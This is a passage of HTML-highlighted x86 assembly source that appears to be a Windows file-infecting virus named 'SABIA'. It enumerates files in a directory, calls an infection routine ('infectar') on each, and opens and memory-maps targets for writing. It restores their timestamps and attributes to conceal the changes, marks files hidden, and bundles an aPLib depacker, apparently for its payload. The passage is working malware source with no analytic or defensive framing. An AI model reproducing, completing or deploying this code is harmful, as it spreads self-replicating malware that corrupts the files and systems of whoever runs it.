   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@007</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">sabia@011</span><span class="sc0">

   </span><span class="sc5">sabia@006</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@006</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lstrcpy</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lstrlen</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">sabia@009</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">sabia@009</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@005.cFileName</span><span class="sc0">

   </span><span class="sc5">sabia@007</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lodsb</span><span class="sc0">
   </span><span class="sc6">stosb</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">sabia@007</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buffer@005.cFileName</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">sabia@004</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buffer@005.nFileSizeLow</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infectar@001</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">sabia@005</span><span class="sc0">

   </span><span class="sc5">sabia@004</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@005</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@007</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindNextFileA</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">sabia@006</span><span class="sc0">

   </span><span class="sc5">sabia@005</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@007</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindClose</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc5">sabia@011</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">IO@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IO@003</span><span class="sc0">

   </span><span class="sc5">IO@002</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">CREATE_NEW</span><span class="sc0">

   </span><span class="sc5">IO@003</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetFileAttributesA</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@008</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">IO@005</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@008</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">

   </span><span class="sc5">IO@005</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CreateFileA</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@001</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">IOB@005</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">handle@009</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetFileTime</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetFileSize</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">IO@004</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">IO@004</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@002</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CreateFileMappingA</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@003</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">IOB@004</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@002</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@003</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapViewOfFile</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@004</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">IOB@003</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">IOB@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">

   </span><span class="sc5">IOB@002</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@004</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">UnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc5">IOB@003</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@003</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@002</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFilePointer</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetEndOfFile</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc5">IOB@004</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">handle@009</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFileTime</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc5">IOB@005</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@008</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">HIDE@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_HIDDEN</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_ARCHIVE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc1">;***************************************************************</span><span class="sc0">
   </span><span class="sc1">;*         aPLib v0.22b  -  the smaller the better :)          *</span><span class="sc0">
   </span><span class="sc1">;*               WASM &amp; TASM assembler depacker                *</span><span class="sc0">
   </span><span class="sc1">;*                                                             *</span><span class="sc0">
   </span><span class="sc1">;*   Copyright (c) 1998-99 by  - Jibz -  All Rights Reserved   *</span><span class="sc0">
   </span><span class="sc1">;***************************************************************</span><span class="sc0">

   </span><span class="sc5">_aP_depack_asm</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebp</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; C calling convention</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">cld</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">

   </span><span class="sc5">literal</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">movsb</span><span class="sc0">

   </span><span class="sc5">nexttag</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">getbit</span><span class="sc0">
   </span><span class="sc6">jnc</span><span class="sc0">    </span><span class="sc5">literal</span><span class="sc0">

   </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">getbit</span><span class="sc0">
   </span><span class="sc6">jnc</span><span class="sc0">    </span><span class="sc5">codepair</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">getbit</span><span class="sc0">
   </span><span class="sc6">jnc</span><span class="sc0">    </span><span class="sc5">shortmatch</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

   </span><span class="sc5">getmorebits</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">getbit</span><span class="sc0">
   </span><span class="sc6">adc</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">jnc</span><span class="sc0">    </span><span class="sc5">getmorebits</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">domatch_with_inc</span><span class="sc0">
   </span><span class="sc6">stosb</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">nexttag</span><span class="sc0">

   </span><span class="sc5">codepair</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">getgamma_no_ecx</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0">   </span><span class="sc5">normalcodepair</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">getgamma</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">domatch</span><span class="sc0">

   </span><span class="sc5">shortmatch</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lodsb</span><span class="sc0">
   </span><span class="sc6">shr</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">donedepacking</span><span class="sc0">
   </span><span class="sc6">adc</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">domatch</span><span class="sc0">

   </span><span class="sc5">normalcodepair</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">shl</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">lodsb</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">getgamma</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32000</span><span class="sc0">
   </span><span class="sc6">jae</span><span class="sc0">    </span><span class="sc5">domatch_with_2inc</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1280</span><span class="sc0">
   </span><span class="sc6">jae</span><span class="sc0">    </span><span class="sc5">domatch_with_inc</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7fh</span><span class="sc0">
   </span><span class="sc6">ja</span><span class="sc0">     </span><span class="sc5">domatch</span><span class="sc0">

   </span><span class="sc5">domatch_with_2inc</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc5">domatch_with_inc</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc5">domatch</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">nexttag</span><span class="sc0">

   </span><span class="sc5">getbit</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">stillbitsleft</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">

   </span><span class="sc5">stillbitsleft</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">getgamma</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc5">getgamma_no_ecx</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc5">getgammaloop</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">getbit</span><span class="sc0">
   </span><span class="sc6">adc</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">getbit</span><span class="sc0">
   </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">getgammaloop</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">donedepacking</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">; return unpacked length in eax</span><span class="sc0">

   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">buffer@001</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc9">name</span><span class="sc5">@001</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'_SABIA_'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
